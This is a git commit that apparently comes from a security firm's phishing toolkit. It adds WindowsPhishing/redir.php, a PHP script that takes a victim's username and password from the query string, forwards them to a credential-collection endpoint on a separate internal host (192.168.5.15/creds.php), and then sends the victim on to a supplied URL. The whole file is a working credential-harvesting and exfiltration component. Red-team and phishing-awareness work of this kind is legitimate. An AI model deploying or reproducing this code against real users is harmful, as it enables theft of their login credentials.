82ec2a334341acd3d73ddac3b00444115f187bbe
Lighthouse IT Security <84382227+lighthouseitsecurity@users.noreply.github.com>
2024-02-24 14:52:13 +0100

    initial commit

---
+++ WindowsPhishing/redir.php
@@ -0,0 +1,14 @@
+<?php
+if(isset($_GET["user"]) and isset($_GET["pass"])) {
+    $user = $_GET["user"];
+    $pass = $_GET["pass"];
+    $url = 'http://192.168.5.15:80/creds.php?user=' . $user . '&pass=' . $pass;
+    file_get_contents($url);
+}
+if(isset($_GET["redir"])) {
+    $redir = $_GET["redir"];
+    if(filter_var($redir, FILTER_VALIDATE_URL)) {
+        echo "<meta http-equiv='Refresh' content='0; url=" . $redir . "' />";
+    }
+}
+?>
